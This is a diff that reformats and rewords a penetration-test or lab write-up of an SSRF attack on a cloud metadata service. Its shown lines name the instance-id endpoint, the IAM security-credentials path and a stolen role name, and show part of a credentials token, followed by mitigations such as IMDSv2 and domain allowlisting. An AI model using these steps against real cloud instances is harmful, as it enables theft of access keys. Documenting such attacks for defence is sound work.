@@ -19,10 +19,16 @@ Result: The server returned the metadata directory, confirming it is vulnerable 
 
 Phase 2: Exploitation
 1. Retrieving the Instance ID
-I queried the instance-id endpoint: http://169.254.169.254/latest/meta-data/instance-id
+I queried the instance-id endpoint:
+
+http://169.254.169.254/latest/meta-data/instance-id
 
 2. Stealing IAM Credentials (The Kill Chain)
-To escalate privileges, I enumerated the IAM role name: latest/meta-data/iam/security-credentials/ Result: ec2-prod-role
+To escalate privileges, I enumerated the IAM role name:
+
+latest/meta-data/iam/security-credentials/
+
+Result: The role name is ec2-prod-role.
 
 Then, I constructed the final payload to steal the keys:
 
@@ -41,8 +47,8 @@ JSON
   "Token" : "IQoJb3Jp..."
 }
 Mitigation
-To prevent this:
+To prevent this attack, organizations should:
 
-Enforce IMDSv2 (Requires Session Token).
+Enforce IMDSv2: This requires a session token and blocks simple SSRF.
 
-Implement strict Input Validation.
+Input Validation: Implement a strict whitelist of allowed domains.
